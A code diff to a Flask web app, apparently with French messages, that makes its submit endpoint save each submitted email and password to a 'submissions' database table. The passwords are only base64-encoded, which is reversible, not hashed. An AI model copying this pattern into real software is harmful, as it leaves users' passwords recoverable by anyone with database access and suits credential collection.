@@ -1,5 +1,7 @@
+import base64
 import os
 import sqlite3
+from datetime import datetime, timezone
 
 from flask import Flask, jsonify, redirect, render_template, request, session, url_for
 
@@ -56,6 +58,36 @@ def get_db_connection():
     )
 
 
+def encode_base64(value: str) -> str:
+    return base64.b64encode(value.encode("utf-8")).decode("utf-8")
+
+
+def store_submission(email_value: str, password_value: str) -> None:
+    encoded_email = encode_base64(email_value)
+    encoded_password = encode_base64(password_value)
+    created_at = datetime.now(timezone.utc).replace(microsecond=0).isoformat()
+
+    with get_db_connection() as conn:
+        if DB_DIALECT == "sqlite":
+            conn.execute(
+                """
+                INSERT INTO submissions (email_value, password_value, created_at)
+                VALUES (?, ?, ?)
+                """,
+                (encoded_email, encoded_password, created_at),
+            )
+        else:
+            with conn.cursor() as cur:
+                cur.execute(
+                    """
+                    INSERT INTO submissions (email_value, password_value, created_at)
+                    VALUES (%s, %s, %s)
+                    """,
+                    (encoded_email, encoded_password, created_at),
+                )
+        conn.commit()
+
+
 def ensure_demo_rows(conn) -> None:
     with conn.cursor() as cur:
         cur.execute("SELECT COUNT(*) FROM submissions")
@@ -110,6 +142,8 @@ def submit():
 
     if not email_value or not password_value:
         return jsonify({"ok": False, "message": "Email et mot de passe requis."}), 400
+
+    store_submission(email_value, password_value)
 
     return jsonify({"ok": True})
 
